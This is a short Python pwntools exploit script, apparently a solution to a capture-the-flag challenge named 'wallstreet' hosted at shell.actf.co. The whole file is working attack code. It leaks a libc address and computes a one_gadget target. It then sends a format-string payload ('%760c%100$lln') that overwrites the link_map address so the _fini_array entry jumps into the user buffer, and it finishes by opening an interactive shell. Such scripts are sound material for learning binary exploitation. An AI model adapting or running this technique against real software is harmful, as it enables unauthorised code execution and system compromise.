#!/usr/bin/python3

from pwn import *
import sys

l = ELF('./libc-2.32.so')
e = ELF('./wallstreet')
if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21800)
else:
    r = process('./W', env={"LD_PRELOAD": "./libc-2.32.so"})


r.sendlineafter('1) Buy some stonks!', '1')
r.sendlineafter('What stonk do you want to see?\n', '56')

libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x1e46c0
one = libc + 0xdf7ad
info(f"""
libc = {hex(libc)}
one = {hex(one)}
""")

# edit l_address
## 0x4040E0(user_buf) - 0x403E20(_fini_array) == 712
## 712 + 0x30 == 760
payload = (b'%760c' + b'%100$lln').ljust(0x30, b'0') + p64(one)
print(payload)
input()
r.sendafter('What is your API token?\n', payload)

r.interactive()
